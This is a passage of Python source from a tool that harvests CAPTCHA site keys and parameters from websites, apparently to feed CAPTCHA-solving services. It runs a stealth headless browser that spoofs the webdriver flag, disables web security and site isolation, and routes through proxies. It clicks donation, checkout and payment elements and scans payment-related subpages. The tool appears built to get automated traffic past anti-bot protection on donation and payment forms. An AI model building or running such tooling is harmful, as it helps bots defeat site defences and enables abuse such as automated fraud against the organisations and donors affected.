]

# ─── reCAPTCHA action pattern ─────────────────────────────────────────────────
_ACTION_PATTERNS = [
    re.compile(r'action\s*:\s*["\']([a-zA-Z0-9_\/]{2,60})["\']', re.I),
    re.compile(r'["\']action["\']\s*:\s*["\']([a-zA-Z0-9_\/]{2,60})["\']', re.I),
    re.compile(r'grecaptcha\.execute\s*\([^,]+,\s*\{[^}]*action\s*:\s*["\']([a-zA-Z0-9_\/]{2,60})["\']', re.I),
]

# ─── Script src signatures ────────────────────────────────────────────────────
_CAPTCHA_SCRIPT_SIGS = {
    "reCAPTCHA":         ["google.com/recaptcha", "recaptcha/api.js"],
    "reCAPTCHA Enterprise": ["recaptcha/enterprise.js"],
    "hCaptcha":          ["hcaptcha.com/1/api.js", "js.hcaptcha.com"],
    "Turnstile":         ["challenges.cloudflare.com/turnstile"],
    "FunCaptcha":        ["funcaptcha.com", "arkoselabs.com"],
    "GeeTest":           ["gt.captcha.com", "static.geetest.com"],
    "FriendlyCaptcha":   ["friendlycaptcha.com/widget", "friendlycaptcha.eu"],
}

# ─── Key format validators — confirm a key matches expected format ────────────
_KEY_VALIDATORS = {
    "reCAPTCHA v2":         lambda k: k.startswith("6L") and 38 <= len(k) <= 40,
    "reCAPTCHA v3":         lambda k: k.startswith("6L") and 38 <= len(k) <= 40,
    "reCAPTCHA Enterprise": lambda k: k.startswith("6L") and 38 <= len(k) <= 40,
    "hCaptcha":             lambda k: bool(re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', k, re.I)),
    "Cloudflare Turnstile": lambda k: bool(re.match(r'^[01]x', k)),
    "FunCaptcha":           lambda k: bool(re.match(r'^[0-9A-Fa-f]{8}-', k)),
    "GeeTest":              lambda k: bool(re.match(r'^[0-9a-f]{32}$', k, re.I)),
    "FriendlyCaptcha":      lambda k: k.upper().startswith("FC"),
    "AWS WAF Captcha":      lambda k: len(k) >= 10,
}


def _extract_captcha_info(html: str, page_url: str, js_sources: dict = None) -> list:
    """
    Extract captcha site_key / action / page_url from HTML + JS.
    v21 fix: priority scan order prevents cross-labeling between
    hCaptcha (UUID), Turnstile (0x/1x), and reCAPTCHA (6L) keys.
    Returns list of finding dicts.
    """
    findings  = []
    seen_keys = set()   # dedup by (key_value) — key is unique regardless of type

    def _scan_text(text: str, source_label: str):
        # Iterate in priority order so hCaptcha/Turnstile claim keys before
        # the generic reCAPTCHA data-sitekey fallback can misattribute them.
        for cap_type in _CAPTCHA_SCAN_ORDER:
            patterns  = _CAPTCHA_PATTERNS.get(cap_type, [])
            validator = _KEY_VALIDATORS.get(cap_type)
            for pat in patterns:
                for m in pat.finditer(text):
                    # Handle alternation groups (e.g. Turnstile context pattern)
                    if m.lastindex and m.lastindex >= 1:
                        key = next((g for g in m.groups() if g), None)
                    else:
                        try:
                            key = m.group(1)
                        except IndexError:
                            key = m.group(0)

                    if not key:
                        continue
                    key = key.strip()
                    if len(key) < 10:
                        continue

                    # ── Validate format — reject cross-type false positives ──
                    if validator and not validator(key):
                        continue

                    # ── Dedup by raw key value (not by type+key) ─────────────
                    # This prevents the same key appearing as both reCAPTCHA v2
                    # and reCAPTCHA v3 when matched by different patterns.
                    if key in seen_keys:
                        continue
                    seen_keys.add(key)

                    # ── Extract action from surrounding ±400 char context ─────
                    action    = ""
                    ctx_start = max(0, m.start() - 400)
                    ctx_end   = min(len(text), m.end() + 400)
                    ctx       = text[ctx_start:ctx_end]
                    for ap in _ACTION_PATTERNS:
                        am = ap.search(ctx)
                        if am:
                            cand = am.group(1)
                            if cand not in ('get', 'set', 'use', 'new',
                                            'add', 'key', 'id', 'login'):
                                action = cand
                                break

                    findings.append({
                        "type":       cap_type,
                        "site_key":   key,
                        "page_url":   page_url,
                        "action":     action,
                        "source":     source_label,
                        "theme":      "",
                        "size":       "",
                        "invisible":  False,
                        "badge":      "",
                        "min_score":  "",
                        "enterprise": cap_type == "reCAPTCHA Enterprise",
                        "s_param":    "",
                        "hl":         "",
                        "co":         "",
                        "callback":   "",
                        "user_agent": "",
                    })

    # ── 1. Scan main HTML body ────────────────────────────────────────────────
    _scan_text(html, "HTML source")

    # ── 2. Scan each inline <script> block separately for better context ──────
    soup = BeautifulSoup(html, 'html.parser')
    for i, script in enumerate(soup.find_all('script')):
        if script.string and script.string.strip():
            _scan_text(script.string, f"Inline script #{i}")

    # ── 3. Scan external JS sources if provided ───────────────────────────────
    if js_sources:
        for js_url, js_text in js_sources.items():
            _scan_text(js_text, f"JS: {js_url[:60]}")

    # ── 4. Script-src detection (captcha present but key not yet found) ───────
    script_tags        = [t.get('src', '') for t in soup.find_all('script', src=True)]
    detected_via_script = set()
    for src in script_tags:
        for cap_type, sigs in _CAPTCHA_SCRIPT_SIGS.items():
            if any(sig in src for sig in sigs):
                detected_via_script.add((cap_type, src))

    # Only append "key not found" entries for types not already resolved
    found_types = {f["type"] for f in findings}
    for cap_type, src in detected_via_script:
        if cap_type not in found_types:
            findings.append({
                "type":     cap_type + " ⚠️ (key not found)",
                "site_key": "",
                "page_url": page_url,
                "action":   "",
                "source":   f"Script include: {src[:80]}",
            })

    return findings

def _sitekey_playwright(url: str, progress_cb=None) -> dict:
    try:
        from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
    except ImportError:
        return {"error": "playwright_not_installed", "findings": [], "page_url": url}

    findings    = []
    seen_keys   = set()
    network_log = []
    console_log = []
    page_url_ref = [url]

    # ── Network URL patterns ──────────────────────
    _NET_PATTERNS = [
        (re.compile(r'google\.com/recaptcha/(?:api2|enterprise)/(?:anchor|bframe|reload)[^"\']*[?&]k=([0-9A-Za-z_\-]{20,60})', re.I), "reCAPTCHA v2"),
        (re.compile(r'recaptcha/(?:api|enterprise)\.js[^"\']*[?&]render=([0-9A-Za-z_\-]{20,60})', re.I), "reCAPTCHA v3"),
        (re.compile(r'recaptcha/enterprise\.js[^"\']*[?&]render=([0-9A-Za-z_\-]{20,60})', re.I), "reCAPTCHA Enterprise"),
        (re.compile(r'hcaptcha\.com/(?:checksiteconfig|getcaptcha|anchor)[^"\']*[?&](?:sitekey|s)=([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', re.I), "hCaptcha"),
        (re.compile(r'challenges\.cloudflare\.com/turnstile[^"\']*[?&](?:sitekey|k)=([0-9A-Za-z_\-]{20,60})', re.I), "Cloudflare Turnstile"),
        (re.compile(r'(?:funcaptcha\.com|arkoselabs\.com)[^"\']*(?:pk|public_key)=([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})', re.I), "FunCaptcha"),
        (re.compile(r'geo\.captcha\.com[^"\']*gt=([0-9a-f]{32})', re.I), "GeeTest"),
        # Generic sitekey in any captcha-related URL
        (re.compile(r'(?:recaptcha|hcaptcha|captcha|turnstile)[^"\']*[?&](?:sitekey|k|key)=([0-9A-Za-z_\-]{20,60})', re.I), "Captcha (generic)"),
        # ── v18: Additional captcha providers ─────────────────────────────
        # FriendlyCaptcha: puzzle endpoint contains sitekey param
        (re.compile(r'friendlycaptcha\.(?:com|eu)/api/v1/puzzle[^"\']*[?&]sitekey=([A-Za-z0-9_\-]{10,60})', re.I), "FriendlyCaptcha"),
        # FriendlyCaptcha generic pattern
        (re.compile(r'friendlycaptcha[^"\']*[?&](?:sitekey|site_key)=([A-Za-z0-9_\-]{10,60})', re.I), "FriendlyCaptcha"),
        # AWS WAF Captcha: token endpoint
        (re.compile(r'(?:captcha\.us-east-1\.amazonaws\.com|token\.awswaf\.com)[^"\']*[?&](?:token|key|jsapi)=([A-Za-z0-9_\-./]{10,120})', re.I), "AWS WAF Captcha"),
        # DataDome: tag.datadome.co device check URL
        (re.compile(r'(?:tag\.datadome\.co|js\.datadome\.com)[^"\']*', re.I), "DataDome"),
        # DataDome: device check with token
        (re.compile(r'api\.datadome\.co/[^"\']*[?&](?:dd_device_id|jsv|jc)=([A-Za-z0-9_\-]{10,80})', re.I), "DataDome"),
        # PerimeterX: px.js or collector endpoint
        (re.compile(r'(?:client\.px-cloud\.net|px-cdn\.net|sactechrisk\.com)/[A-Za-z0-9]+/main\.min\.js', re.I), "PerimeterX"),
        (re.compile(r'(?:collector(?:-[a-z]+)?\.px-cdn\.net|sactechrisk\.com)/[^"\']*appId=([A-Za-z0-9_\-]{8,40})', re.I), "PerimeterX"),
    ]

    _BODY_PATTERNS = [
        (re.compile(r'"sitekey"\s*:\s*"([0-9A-Za-z_\-]{20,60})"', re.I), "POST body"),
        (re.compile(r'"site_key"\s*:\s*"([0-9A-Za-z_\-]{20,60})"', re.I), "POST body"),
        (re.compile(r'sitekey=([0-9A-Za-z_\-]{20,60})', re.I), "POST body"),
        (re.compile(r'"k"\s*:\s*"(6[A-Za-z0-9_\-]{39})"', re.I), "POST body (reCAPTCHA v3)"),
        (re.compile(r'"gt"\s*:\s*"([0-9a-f]{32})"', re.I), "POST body (GeeTest)"),
    ]

    def _classify_key(key: str) -> str:
        if re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', key, re.I):
            return "hCaptcha"
        if re.match(r'^[01]x[0-9A-Fa-f_\-]{20,}', key):
            return "Cloudflare Turnstile"
        if re.match(r'^6[A-Za-z0-9_\-]{39}$', key):
            return "reCAPTCHA v2/v3"
        if re.match(r'^[0-9a-f]{32}$', key):
            return "GeeTest"
        if re.match(r'^[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-', key):
            return "FunCaptcha"
        return "reCAPTCHA"

    def _add(cap_type, key, source, extra=None):
        key = key.strip()
        dedup = cap_type + ":" + key
        if dedup not in seen_keys and len(key) >= 10:
            seen_keys.add(dedup)
            ex = extra or {}
            findings.append({
                "type":       cap_type,
                "site_key":   key,
                "page_url":   page_url_ref[0],
                "action":     ex.get("action", ""),
                "source":     source,
                "theme":      ex.get("theme", ""),
                "size":       ex.get("size", ""),
                "invisible":  ex.get("invisible", False),
                "badge":      ex.get("badge", ""),
                "min_score":  ex.get("min_score", ""),
                "enterprise": ex.get("enterprise", False),
                "s_param":    ex.get("s_param", ""),
                "hl":         ex.get("hl", ""),
                "co":         ex.get("co", ""),
                "callback":   ex.get("callback", ""),
                "user_agent": "",   # filled later
            })

    def _scan_url(req_url):
        for pat, cap_type in _NET_PATTERNS:
            m = pat.search(req_url)
            if m:
                _add(cap_type, m.group(1), f"Network URL: {req_url[:120]}")

    def _scan_text(text, source):
        for pat, label in _BODY_PATTERNS:
            for m in pat.finditer(text):
                key = m.group(1)
                _add(_classify_key(key), key, f"{label} / {source}")
        # also run full _CAPTCHA_PATTERNS
        for cap_type, patterns in _CAPTCHA_PATTERNS.items():
            for pat in patterns:
                for m in pat.finditer(text):
                    try:
                        key = next((g for g in m.groups() if g), m.group(0))
                        if key and len(key) >= 10:
                            _add(cap_type, key, source)
                    except Exception:
                        pass

    with sync_playwright() as pw:
        if progress_cb: progress_cb("🌐 Launching stealth browser...")

        # Proxy support
        _pw_proxy_cfg = None
        _px = proxy_manager.get_proxy()
        if _px:
            from urllib.parse import urlparse as _up
            _pp = _up(_px.get("http") or _px.get("https", ""))
            _pw_proxy_cfg = {"server": f"{_pp.scheme}://{_pp.hostname}:{_pp.port}"}
            if _pp.username:
                _pw_proxy_cfg["username"] = _pp.username
                _pw_proxy_cfg["password"] = _pp.password or ""

        browser = pw.chromium.launch(
            headless=True,
            args=[
                '--no-sandbox',
                '--disable-dev-shm-usage',
                '--disable-blink-features=AutomationControlled',
                '--disable-web-security',
                '--disable-features=IsolateOrigins,site-per-process',
                '--flag-switches-begin',
                '--disable-site-isolation-trials',
                '--flag-switches-end',
            ]
        )

        ctx = browser.new_context(
            user_agent=(
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                'AppleWebKit/537.36 (KHTML, like Gecko) '
                'Chrome/122.0.0.0 Safari/537.36'
            ),
            viewport={"width": 1366, "height": 768},
            ignore_https_errors=True,
            proxy=_pw_proxy_cfg,
            java_script_enabled=True,
            # Bypass bot detection headers
            extra_http_headers={
                "Accept-Language": "en-US,en;q=0.9",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
            }
        )

        # Anti-detection: remove webdriver flag
        ctx.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
            Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3]});
            Object.defineProperty(navigator, 'languages', {get: () => ['en-US','en']});
            window.chrome = {runtime: {}};
        """)

        page = ctx.new_page()

        # ── Hook 1: Network request interception ─────
        def _on_request(req):
            ru = req.url
            network_log.append(ru)
            _scan_url(ru)
            try:
                body = req.post_data
                if body and len(body) > 5:
                    _scan_text(body, f"POST → {ru[:80]}")
            except Exception:
                pass

        # ── Hook 2: Response body scan ───────────────
        def _on_response(resp):
            ru = resp.url
            captcha_sigs = ['recaptcha', 'hcaptcha', 'turnstile', 'funcaptcha',
                            'geetest', 'captcha', 'arkoselabs']
            if any(s in ru.lower() for s in captcha_sigs):
                try:
                    body = resp.body()
                    if body:
                        _scan_text(body.decode('utf-8', errors='ignore'), f"Response ← {ru[:80]}")
                except Exception:
                    pass

        # ── Hook 3: Console messages ─────────────────
        def _on_console(msg):
            try:
                console_log.append(msg.text)
            except Exception:
                pass

        page.on("request",  _on_request)
        page.on("response", _on_response)
        page.on("console",  _on_console)

        if progress_cb: progress_cb("📡 Loading page (intercepting all network traffic)...")

        try:
            page.goto(url, wait_until="load", timeout=30_000)
            page_url_ref[0] = page.url
        except PWTimeout:
            page_url_ref[0] = page.url
        except Exception as e:
            browser.close()
            return {"error": str(e), "findings": [], "page_url": url}

        # Wait for networkidle — give JS time to execute and inject widgets
        try:
            page.wait_for_load_state("networkidle", timeout=15_000)
        except Exception:
            pass

        if progress_cb: progress_cb("🖱️ Simulating user interaction to trigger lazy captchas...")

        # ── Simulate user interaction ─────────────────
        try:
            # Scroll slowly to trigger lazy-load captchas
            page.evaluate("window.scrollTo(0, document.body.scrollHeight / 3)")
            page.wait_for_timeout(1200)
            page.evaluate("window.scrollTo(0, document.body.scrollHeight / 2)")
            page.wait_for_timeout(1200)
            page.evaluate("window.scrollTo(0, document.body.scrollHeight)")
            page.wait_for_timeout(1200)

            # Click/focus on form fields and buttons to trigger captcha widgets
            for selector in [
                'input[type="email"]', 'input[type="text"]',
                'input[name="amount"]', 'input[name="give-amount"]',
                'input[name="donation_amount"]', 'input[type="number"]',
                'textarea',
                # Donation form amount buttons (GiveWP, Stripe, PayPal)
                '.give-donation-amount-wrapper button',
                '.give-btn-level', '.give-btn-level-default',
                'button[data-amount]', 'input[data-amount]',
                '[class*="amount"]', '[class*="donation"]',
                # Submit-like buttons
                'button[type="submit"]', 'input[type="submit"]',
                '.give-submit', '#give-purchase-button', '.wpcf7-submit',
                'button[id*="submit"]', 'button[id*="donate"]',
                'button[class*="donate"]', 'button[class*="submit"]',
                # Captcha widget containers
                '.g-recaptcha', '[data-sitekey]',
                '#contact', '.contact-form', 'form',
                # Payment step triggers
                '[class*="payment"]', '[class*="checkout"]',
                '[class*="give-"]', '[id*="give-"]',
            ]:
                try:
                    el = page.query_selector(selector)
                    if el and el.is_visible():
                        el.scroll_into_view_if_needed()
                        page.wait_for_timeout(300)
                        try:
                            el.click(timeout=2000)
                        except Exception:
                            pass
                        page.wait_for_timeout(300)
                except Exception:
                    pass

            # Wait for captcha iframes to appear after interaction
            for captcha_frame_sel in [
                'iframe[src*="recaptcha"]',
                'iframe[src*="hcaptcha"]',
                'iframe[src*="turnstile"]',
                'iframe[src*="challenges.cloudflare"]',
            ]:
                try:
                    page.wait_for_selector(captcha_frame_sel, timeout=5_000)
                    break
                except Exception:
                    pass

            page.wait_for_timeout(3000)

            # ── Extra: scan all iframe srcs AFTER interaction ──────────
            try:
                iframe_srcs = page.evaluate("""() =>
                    Array.from(document.querySelectorAll('iframe'))
                         .map(f => f.src || f.getAttribute('src') || '')
                         .filter(Boolean)
                """)
                for src in (iframe_srcs or []):
                    _scan_url(src)
            except Exception:
                pass

            # Final networkidle after interaction
            try:
                page.wait_for_load_state("networkidle", timeout=8_000)
            except Exception:
                pass

        except Exception:
            pass

        if progress_cb: progress_cb("🔍 Deep DOM + window object mining...")

        # ── DOM + window object deep scan ─────────────
        try:
            dom_result = page.evaluate("""() => {
                const results = [];
                const seen = new Set();

                function add(key, source, type, extra) {
                    if (!key || key.length < 10) return;
                    const dedup = type + ':' + key;
                    if (seen.has(dedup)) return;
                    seen.add(dedup);
                    results.push({key, source, type: type || 'unknown', extra: extra || {}});
                }

                // ── 1. data-sitekey + ALL captcha widget attributes ──
                function getWidgetAttrs(el) {
                    return {
                        theme:    el.getAttribute('data-theme') || '',
                        size:     el.getAttribute('data-size') || '',
                        callback: el.getAttribute('data-callback') || '',
                        expired:  el.getAttribute('data-expired-callback') || '',
                        tabindex: el.getAttribute('data-tabindex') || '',
                        invisible: el.getAttribute('data-size') === 'invisible' ||
                                   el.getAttribute('data-badge') != null,
                        badge:    el.getAttribute('data-badge') || '',
                        action:   el.getAttribute('data-action') || '',
                    };
                }
                function scanDOM(root) {
                    root.querySelectorAll('[data-sitekey]').forEach(el => {
                        add(el.getAttribute('data-sitekey'),
                            'DOM attr: ' + el.tagName,
                            '',
                            getWidgetAttrs(el));
                    });
                    // cf-turnstile specific
                    root.querySelectorAll('.cf-turnstile').forEach(el => {
                        const k = el.getAttribute('data-sitekey');
                        if (k) add(k, 'cf-turnstile div', 'Cloudflare Turnstile', {
                            theme:  el.getAttribute('data-theme') || '',
                            action: el.getAttribute('data-action') || '',
                            cData:  el.getAttribute('data-cdata') || '',
                        });
                    });
                    // ── v18: FriendlyCaptcha widget ──────────────────────────────
                    root.querySelectorAll('.frc-captcha[data-sitekey]').forEach(el => {
                        const k = el.getAttribute('data-sitekey');
                        if (k) add(k, '.frc-captcha[data-sitekey]', 'FriendlyCaptcha', {
                            lang:     el.getAttribute('data-lang') || '',
                            callback: el.getAttribute('data-callback') || '',
                        });
                    });
                    root.querySelectorAll('friendly-captcha[puzzle-endpoint],[start="auto"][data-sitekey]').forEach(el => {
                        const k = el.getAttribute('data-sitekey') || el.getAttribute('sitekey');
                        if (k) add(k, 'friendly-captcha element', 'FriendlyCaptcha', {});
                    });
                    // ── v18: AWS WAF Captcha token container ─────────────────────
                    root.querySelectorAll('[data-aws-waf-token],[id*="awswaf"],[class*="awswaf"]').forEach(el => {
                        const tok = el.getAttribute('data-aws-waf-token') || el.textContent;
                        if (tok && tok.length > 10) add(tok.substring(0,120), '[data-aws-waf-token]', 'AWS WAF Captcha', {});
                    });
                    // Shadow DOM
                    root.querySelectorAll('*').forEach(el => {
                        if (el.shadowRoot) scanDOM(el.shadowRoot);
                    });
                }
                scanDOM(document);

                // ── 2. iframe srcs ──
                document.querySelectorAll('iframe').forEach(f => {
                    const src = f.src || '';
                    // reCAPTCHA anchor
                    let m = src.match(/[?&]k=([A-Za-z0-9_-]{20,60})/);
                    if (m) {
                        const co = src.match(/[?&]co=([A-Za-z0-9%]+)/);
                        const hl = src.match(/[?&]hl=([a-z\-]+)/);
                        const v  = src.match(/[?&]v=([A-Za-z0-9_\-]+)/);
                        add(m[1], 'iframe src', 'reCAPTCHA v2', {
                            co: co ? decodeURIComponent(co[1]) : '',
                            hl: hl ? hl[1] : '',
                            v:  v  ? v[1]  : '',
                            invisible: src.includes('size=invisible'),
                        });
                    }
                    // hCaptcha
                    m = src.match(/sitekey=([0-9a-f\-]{36})/i);
                    if (m) add(m[1], 'iframe src', 'hCaptcha', {});
                });

                // ── 3. window.___grecaptcha_cfg — full client details ──
                try {
                    if (window.___grecaptcha_cfg && window.___grecaptcha_cfg.clients) {
                        Object.entries(window.___grecaptcha_cfg.clients).forEach(([id, c]) => {
                            function findSitekeys(obj, depth, path) {
                                if (depth > 6 || !obj) return;
                                if (typeof obj === 'object') {
                                    // Look for sitekey/key fields directly
                                    const skFields = ['sitekey','site_key','k','key'];
                                    skFields.forEach(f => {
                                        if (obj[f] && typeof obj[f] === 'string' && obj[f].length >= 20) {
                                            const extra = {
                                                action:    obj.action || obj.params?.action || '',
                                                theme:     obj.theme || obj.params?.theme || '',
                                                size:      obj.size || obj.params?.size || '',
                                                invisible: !!(obj.size === 'invisible' || obj.badge),
                                                badge:     obj.badge || '',
                                                s_param:   obj.s || '',
                                                enterprise: !!window.___grecaptcha_cfg.fns,
                                                min_score:  obj.minScore || '',
                                            };
                                            add(obj[f], 'grecaptcha_cfg.clients[' + id + '].' + f, 'reCAPTCHA', extra);
                                        }
                                    });
                                    Object.values(obj).forEach(v => findSitekeys(v, depth+1, path));
                                }
                            }
                            findSitekeys(c, 0, '');
                        });
                    }
                } catch(e) {}

                // ── 4. hCaptcha widget config ──
                try {
                    if (window.hcaptcha) {
                        // hcaptcha.getRespKey / internal state
                        const hcIframes = document.querySelectorAll('iframe[src*="hcaptcha"]');
                        hcIframes.forEach(f => {
                            const src = f.src;
                            const sk = src.match(/sitekey=([0-9a-f\-]{36})/i);
                            const hl = src.match(/[?&]hl=([a-z\-]+)/i);
                            const theme = src.match(/[?&]theme=([a-z]+)/i);
                            if (sk) add(sk[1], 'hcaptcha iframe', 'hCaptcha', {
                                hl:    hl ? hl[1] : '',
                                theme: theme ? theme[1] : '',
                            });
                        });
                    }
                } catch(e) {}

                // ── 5. reCAPTCHA v3 grecaptcha.execute calls ──
                try {
                    // Intercept grecaptcha.execute to grab key + action
                    if (window.grecaptcha) {
                        const origExec = window.grecaptcha.execute;
                        if (typeof origExec === 'function') {
                            // Try to extract from source text
                            const scriptTexts = Array.from(document.querySelectorAll('script:not([src])'))
                                .map(s => s.textContent).join('\n');
                            const execMatches = scriptTexts.matchAll(
                                /grecaptcha\.execute\s*\(\s*['"]([A-Za-z0-9_\-]{20,60})['"]\s*,\s*\{[^}]*action\s*:\s*['"]([a-zA-Z0-9_\/]{2,60})['"]/g
                            );
                            for (const m of execMatches) {
                                add(m[1], 'grecaptcha.execute() call', 'reCAPTCHA v3', {action: m[2]});
                            }
                        }
                    }
                } catch(e) {}

                // ── 6. Inline script full scan with extra fields ──
                document.querySelectorAll('script:not([src])').forEach((s, i) => {
                    const t = s.textContent || '';
                    // v3 keys (start with 6)
                    [...t.matchAll(/['"](6[A-Za-z0-9_\-]{39})['"]/g)].forEach(m => {
                        // Look for nearby action
                        const ctx = t.substring(Math.max(0, m.index-200), m.index+200);
                        const act = ctx.match(/action\s*:\s*['"]([a-zA-Z0-9_\/]{2,60})['"]/);
                        add(m[1], 'inline script #'+i, 'reCAPTCHA v3', {action: act ? act[1] : ''});
                    });
                    // hCaptcha UUIDs
                    [...t.matchAll(/['"]([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})['"]/gi)].forEach(m => {
                        add(m[1], 'inline script #'+i+' (UUID)', 'hCaptcha', {});
                    });
                    // Turnstile 0x/1x keys
                    [...t.matchAll(/['"]([01]x[A-Fa-f0-9_\-]{20,60})['"]/g)].forEach(m => {
                        add(m[1], 'inline script #'+i, 'Cloudflare Turnstile', {});
                    });
                    // Generic sitekey= assignments
                    [...t.matchAll(/sitekey\s*[:=]\s*['"]([A-Za-z0-9_\-]{20,60})['"]/gi)].forEach(m => {
                        add(m[1], 'inline script #'+i+' sitekey=', '', {});
                    });
                });

                // ── 7. window globals ──
                const kwds = ['sitekey','site_key','recaptcha','captcha','hcaptcha','turnstile','captchaKey'];
                try {
                    Object.keys(window).forEach(k => {
                        if (kwds.some(kw => k.toLowerCase().includes(kw))) {
                            try {
                                const v = window[k];
                                if (typeof v === 'string' && v.length >= 10 && v.length <= 80) {
                                    add(v, 'window.' + k, '', {});
                                } else if (typeof v === 'object' && v !== null) {
                                    const js = JSON.stringify(v);
                                    [
                                        ...js.matchAll(/"(?:sitekey|site_key|key)":"([A-Za-z0-9_\-]{20,60})"/g),
                                        ...js.matchAll(/"(6[A-Za-z0-9_\-]{39})"/g),
                                        ...js.matchAll(/"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"/gi),
                                    ].forEach(m => add(m[1], 'window.'+k+' obj', '', {}));
                                }
                            } catch(e) {}
                        }
                    });
                } catch(e) {}

                return results;
            }""")

            for item in (dom_result or []):
                key = (item.get("key") or "").strip()
                if not key or len(key) < 10:
                    continue
                hint = item.get("type") or _classify_key(key)
                if not hint or hint == "unknown":
                    hint = _classify_key(key)
                extra = item.get("extra") or {}
                dedup = hint + ":" + key
                if dedup not in seen_keys:
                    seen_keys.add(dedup)
                    findings.append({
                        "type":     hint,
                        "site_key": key,
                        "page_url": page_url_ref[0],
                        "action":   extra.get("action", ""),
                        "source":   item.get("source", "DOM"),
                        # ── Extra fields for captcha solvers ──
                        "theme":      extra.get("theme", ""),
                        "size":       extra.get("size", ""),
                        "invisible":  extra.get("invisible", False),
                        "badge":      extra.get("badge", ""),
                        "min_score":  extra.get("min_score", ""),
                        "enterprise": extra.get("enterprise", False),
                        "s_param":    extra.get("s_param", ""),
                        "hl":         extra.get("hl", ""),
                        "co":         extra.get("co", ""),
                        "callback":   extra.get("callback", ""),
                    })

        except Exception as e:
            logger.debug("DOM eval error: %s", e)

        # ── Scan rendered HTML ─────────────────────────
        try:
            final_html = page.content()
            _scan_text(final_html, "Rendered HTML (post-JS)")
        except Exception:
            final_html = ""

        # ── Scan all loaded JS source text via CDP ─────
        if progress_cb: progress_cb("📦 Extracting inline JS variables...")
        try:
            js_urls_in_page = page.evaluate("""() =>
                Array.from(document.querySelectorAll('script[src]'))
                     .map(s => s.src)
                     .filter(s => s.startsWith('http'))
            """)
            # Fetch and scan up to 10 JS files via browser (bypasses IP blocks)
            for js_url in (js_urls_in_page or [])[:10]:
                try:
                    js_resp = ctx.request.get(js_url, timeout=8000)
                    if js_resp.ok:
                        _scan_text(js_resp.text(), f"JS via browser: {js_url[:80]}")
                except Exception:
                    pass
        except Exception:
            pass

        browser.close()

    # ── Console log scan ─────────────────────────────
    if console_log:
        _scan_text("\n".join(console_log), "Console log")

    # ── Fill user_agent into all findings ────────────
    ua = _get_headers().get("User-Agent", "")
    for f in findings:
        if not f.get("user_agent"):
            f["user_agent"] = ua

    return {
        "findings":    findings,
        "page_url":    page_url_ref[0],
        "js_fetched":  len(network_log),
        "error":       None,
    }

def _sitekey_sync(url: str, progress_cb=None) -> dict:
    """
    Try Playwright (DevTools-style) first.
    Falls back to requests-based static scan if Playwright not available.
    Option A: Playwright constructor hooks (grecaptcha/hcaptcha/turnstile).
    Option B: Deep asset fetch for additional JS bundles.
    """
    # ── Option A: Playwright dynamic hooks (sitekey category) ─────────
    # Run alongside main playwright scan via _playwright_dynamic_scan
    if PLAYWRIGHT_OK:
        if progress_cb: progress_cb("🌐 Dynamic captcha hook intercept...")
        dyn = _playwright_dynamic_scan(url, "sitekey", progress_cb)
    else:
        dyn = {"hooks": {}, "xhr": [], "fetch_": [], "storage": {}}

    # ── Main playwright scan ───────────────────────────────────────────
    result = _sitekey_playwright(url, progress_cb)
    if result.get("error") == "playwright_not_installed":
        if progress_cb: progress_cb("⚠️ Playwright မရှိ — static scan သို့ fallback...")
        result = _sitekey_static(url, progress_cb)

    # ── Option A: merge hook captures into findings ────────────────────
    sk_hook = dyn.get("hooks", {}).get("sitekey", {})
    _hook_type_map = {
        "recaptcha_v2": "reCAPTCHA v2 (dynamic hook)",
        "recaptcha_v3": "reCAPTCHA v3 (dynamic hook)",
        "hcaptcha":     "hCaptcha (dynamic hook)",
        "turnstile":    "Cloudflare Turnstile (dynamic hook)",
    }
    existing_keys = {f.get("site_key", "") for f in result.get("findings", [])}
    for hook_k, type_label in _hook_type_map.items():
        val = sk_hook.get(hook_k, "")
        if val and val not in existing_keys:
            result.setdefault("findings", []).append({
                "type":     type_label,
                "site_key": val,
                "source":   "Playwright constructor hook",
                "action":   "",
            })
            existing_keys.add(val)

    # ── Option B: deep asset fetch → re-scan with captcha patterns ─────
    if progress_cb: progress_cb("📦 Deep asset fetch for captcha keys...")
    existing_log = []  # sitekey result doesn't expose network_log directly
    new_assets   = _deep_asset_fetch(url, existing_log, progress_cb)

    if new_assets:
        all_js = {a["url"]: a["response_body"] for a in new_assets}
        html_  = ""
        extra  = _extract_captcha_info(html_, url, all_js)
        for f in extra:
            sk = f.get("site_key", "")
            if sk and sk not in existing_keys:
                f["source"] = f.get("source", "") + " [deep fetch]"
                result.setdefault("findings", []).append(f)
                existing_keys.add(sk)

    return result


def _sitekey_with_subpages(url: str, progress_cb=None) -> dict:
    """
    v18.1: Scan main URL + all sub-pages concurrently.
    Merges all findings, tagged with source path. Main URL findings first.
    """
    parsed      = urlparse(url)
    base_origin = f"{parsed.scheme}://{parsed.netloc}"

    sub_paths = [
        "/contact", "/donate", "/checkout", "/payment",
        "/register", "/signup", "/login", "/cart", "/donation",
        "/get-involved", "/give", "/contribute",
        # v18.1 additions
        "/pricing", "/plans", "/subscribe", "/membership",
        "/join", "/support", "/help", "/feedback",
        "/order", "/pay", "/billing", "/upgrade",
    ]

    all_findings = []
    seen_keys    = set()
    total        = 1 + len(sub_paths)   # main + sub-pages
    scanned      = [0]

    def _scan_one(scan_url: str, label: str) -> list:
        """Scan a single URL; return tagged findings list."""
        try:
            res = _sitekey_sync(scan_url)
        except Exception:
            return []
        hits = []
        for f in (res.get("findings") or []):
